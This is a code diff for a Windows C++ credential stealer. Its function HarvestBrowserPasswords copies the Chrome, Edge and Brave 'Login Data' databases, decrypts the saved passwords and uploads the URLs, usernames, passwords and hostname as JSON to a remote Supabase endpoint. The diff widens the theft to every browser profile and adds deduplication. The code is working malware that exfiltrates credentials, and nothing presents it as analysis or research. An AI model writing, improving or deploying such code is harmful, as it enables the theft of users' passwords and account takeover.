@@ -1060,59 +1060,93 @@ static void HarvestBrowserPasswords() {
         LocalFree(outBlob.pbData);
         if (keyLen != 32) { LogMsg(bName + ": unexpected key length " + std::to_string(keyLen)); continue; }
 
-        // Copy Login Data to temp
-        std::string ldPath = la + kChromeBrowsers[b].ld;
-        char tmpDir[MAX_PATH]; GetTempPathA(MAX_PATH, tmpDir);
-        std::string tmpLd = std::string(tmpDir) + "NPLD_" + std::to_string(GetTickCount()) + ".tmp";
-        if (!CopyFileA(ldPath.c_str(), tmpLd.c_str(), FALSE)) { LogMsg(bName + ": Login Data copy failed"); continue; }
-
-        HANDLE hF = CreateFileA(tmpLd.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-        HANDLE hM = NULL; const uint8_t* dbMap = NULL; size_t dbSz = 0;
-        if (hF != INVALID_HANDLE_VALUE) { dbSz = GetFileSize(hF, NULL); if (dbSz > 100) { hM = CreateFileMapping(hF, NULL, PAGE_READONLY, 0, 0, NULL); if (hM) dbMap = (const uint8_t*)MapViewOfFile(hM, FILE_MAP_READ, 0, 0, 0); } }
-        if (!dbMap) { if (hF) CloseHandle(hF); DeleteFileA(tmpLd.c_str()); LogMsg(bName + ": Login Data map failed"); continue; }
-
-        int psInt = SqliteU16(dbMap + 16); if (psInt == 1) psInt = 65536; if (psInt < 512) psInt = 512; uint16_t ps = (uint16_t)psInt;
-
-        int rootP = SqliteFindTableRoot(dbMap, dbSz, ps, "logins");
-        if (rootP <= 0) { LogMsg(bName + ": logins table not found"); }
-        if (rootP > 0) {
-            struct HCtx { const uint8_t* db; size_t dbSz; uint16_t ps; uint8_t* ak; int kl; const char* bn; const char* hn; std::string batch; bool first; int count; };
-            HCtx hc = { dbMap, dbSz, ps, aesKey, 32, kChromeBrowsers[b].name, g_hostname.c_str(), "[", true, 0 };
- 
-            SqliteWalk(dbMap, dbSz, ps, rootP, [](int64_t, const uint8_t* p, int pl, void* u) -> bool {
-                auto* h = (HCtx*)u; int urlL;
-                const uint8_t* urlD = SqliteColumn(p, pl, 0, &urlL);
-                if (!urlD || urlL <= 0) return true;
-                std::string url((const char*)urlD, urlL);
-                if (url.find("://") == std::string::npos || url.find("chrome://") == 0 || url.find("about:") == 0 || url.find("edge://") == 0 || url.find("brave://") == 0) return true;
- 
-                int usrL; const uint8_t* usrD = SqliteColumn(p, pl, 3, &usrL);
-                if (!usrD || usrL <= 0) return true;
-                std::string usr((const char*)usrD, usrL);
- 
-                int pwL; const uint8_t* pwD = SqliteColumn(p, pl, 5, &pwL);
-                if (!pwD || pwL <= 15) return true;
- 
-                std::string pwd;
-                if (!ChromeDecryptPassword(h->ak, h->kl, pwD, pwL, h->bn, url, pwd) || pwd.empty()) return true;
- 
-                std::string row = std::string(h->first ? "" : ",") + "{\"hostname\":\"" + EscapeJSON(h->hn) + "\",\"browser\":\"" + EscapeJSON(h->bn) + "\",\"origin_url\":\"" + EscapeJSON(url) + "\",\"username_value\":\"" + EscapeJSON(usr) + "\",\"password_value\":\"" + EscapeJSON(pwd) + "\"}";
-                h->batch += row; h->first = false; h->count++;
-                LogMsg(std::string(h->bn) + ": " + url + " / " + usr);
-                return true;
-            }, &hc);
- 
-            if (hc.count > 0) {
-                hc.batch += "]";
-                std::string pr;
-                HttpRequest(L"POST", SUPABASE_PASSWORDS_PATH, hc.batch, pr);
-                LogMsg(std::string(kChromeBrowsers[b].name) + ": " + std::to_string(hc.count) + " passwords uploaded");
+        // === Enumerate all profile Login Data files ===
+        std::string ldBase = la + kChromeBrowsers[b].ld;
+        std::vector<std::string> ldPaths;
+        std::string suffix = "\\Default\\Login Data";
+        size_t sufPos = ldBase.rfind(suffix);
+        if (sufPos != std::string::npos && sufPos + suffix.size() == ldBase.size()) {
+            std::string userDataDir = ldBase.substr(0, sufPos);
+            ldPaths.push_back(userDataDir + "\\Default\\Login Data");
+            std::string searchPath = userDataDir + "\\Profile*";
+            WIN32_FIND_DATAA fd;
+            HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
+            if (hFind != INVALID_HANDLE_VALUE) {
+                do {
+                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+                        ldPaths.push_back(userDataDir + "\\" + fd.cFileName + "\\Login Data");
+                } while (FindNextFileA(hFind, &fd));
+                FindClose(hFind);
             }
+        } else {
+            ldPaths.push_back(ldBase);
         }
- 
-        UnmapViewOfFile(dbMap);
-        if (hM) CloseHandle(hM); if (hF) CloseHandle(hF);
-        DeleteFileA(tmpLd.c_str());
+
+        std::string batch = "[";
+        bool first = true;
+        int totalCount = 0;
+        std::vector<std::string> seenDedup;
+
+        for (size_t pi = 0; pi < ldPaths.size(); pi++) {
+            std::string ldPath = ldPaths[pi];
+            char tmpDir[MAX_PATH]; GetTempPathA(MAX_PATH, tmpDir);
+            std::string tmpLd = std::string(tmpDir) + "NPLD_" + std::to_string(GetTickCount()) + "_" + std::to_string(pi) + ".tmp";
+            if (!CopyFileA(ldPath.c_str(), tmpLd.c_str(), FALSE)) continue;
+
+            HANDLE hF = CreateFileA(tmpLd.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+            HANDLE hM = NULL; const uint8_t* dbMap = NULL; size_t dbSz = 0;
+            if (hF != INVALID_HANDLE_VALUE) { dbSz = GetFileSize(hF, NULL); if (dbSz > 100) { hM = CreateFileMapping(hF, NULL, PAGE_READONLY, 0, 0, NULL); if (hM) dbMap = (const uint8_t*)MapViewOfFile(hM, FILE_MAP_READ, 0, 0, 0); } }
+            if (!dbMap) { if (hF) CloseHandle(hF); DeleteFileA(tmpLd.c_str()); continue; }
+
+            int psInt = SqliteU16(dbMap + 16); if (psInt == 1) psInt = 65536; if (psInt < 512) psInt = 512; uint16_t ps = (uint16_t)psInt;
+
+            int rootP = SqliteFindTableRoot(dbMap, dbSz, ps, "logins");
+            if (rootP <= 0) { LogMsg(bName + ": logins table not found in " + ldPath); }
+            if (rootP > 0) {
+                struct HCtx { const uint8_t* db; size_t dbSz; uint16_t ps; uint8_t* ak; int kl; const char* bn; const char* hn; std::string* batch; bool* first; int* count; std::vector<std::string>* seen; };
+                HCtx hc = { dbMap, dbSz, ps, aesKey, 32, kChromeBrowsers[b].name, g_hostname.c_str(), &batch, &first, &totalCount, &seenDedup };
+
+                SqliteWalk(dbMap, dbSz, ps, rootP, [](int64_t, const uint8_t* p, int pl, void* u) -> bool {
+                    auto* h = (HCtx*)u; int urlL;
+                    const uint8_t* urlD = SqliteColumn(p, pl, 0, &urlL);
+                    if (!urlD || urlL <= 0) return true;
+                    std::string url((const char*)urlD, urlL);
+                    if (url.find("://") == std::string::npos || url.find("chrome://") == 0 || url.find("about:") == 0 || url.find("edge://") == 0 || url.find("brave://") == 0) return true;
+
+                    int usrL; const uint8_t* usrD = SqliteColumn(p, pl, 3, &usrL);
+                    if (!usrD || usrL <= 0) return true;
+                    std::string usr((const char*)usrD, usrL);
+
+                    std::string dedupKey = url + "|" + usr;
+                    for (size_t i = 0; i < h->seen->size(); i++) {
+                        if ((*h->seen)[i] == dedupKey) return true;
+                    }
+                    h->seen->push_back(dedupKey);
+
+                    int pwL; const uint8_t* pwD = SqliteColumn(p, pl, 5, &pwL);
+                    if (!pwD || pwL <= 15) return true;
+
+                    std::string pwd;
+                    if (!ChromeDecryptPassword(h->ak, h->kl, pwD, pwL, h->bn, url, pwd) || pwd.empty()) return true;
+
+                    std::string row = std::string(*h->first ? "" : ",") + "{\"hostname\":\"" + EscapeJSON(h->hn) + "\",\"browser\":\"" + EscapeJSON(h->bn) + "\",\"origin_url\":\"" + EscapeJSON(url) + "\",\"username_value\":\"" + EscapeJSON(usr) + "\",\"password_value\":\"" + EscapeJSON(pwd) + "\"}";
+                    *h->batch += row; *h->first = false; (*h->count)++;
+                    LogMsg(std::string(h->bn) + ": " + url + " / " + usr);
+                    return true;
+                }, &hc);
+            }
+
+            UnmapViewOfFile(dbMap);
+            if (hM) CloseHandle(hM); if (hF) CloseHandle(hF);
+            DeleteFileA(tmpLd.c_str());
+        }
+
+        if (totalCount > 0) {
+            batch += "]";
+            std::string pr;
+            HttpRequest(L"POST", SUPABASE_PASSWORDS_PATH, batch, pr);
+            LogMsg(std::string(kChromeBrowsers[b].name) + ": " + std::to_string(totalCount) + " passwords uploaded from " + std::to_string(ldPaths.size()) + " profile(s)");
+        }
     }
     LogMsg("Browser password harvest complete");
 }
@@ -1734,3 +1768,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 
     return 0;
 }
+
+
+
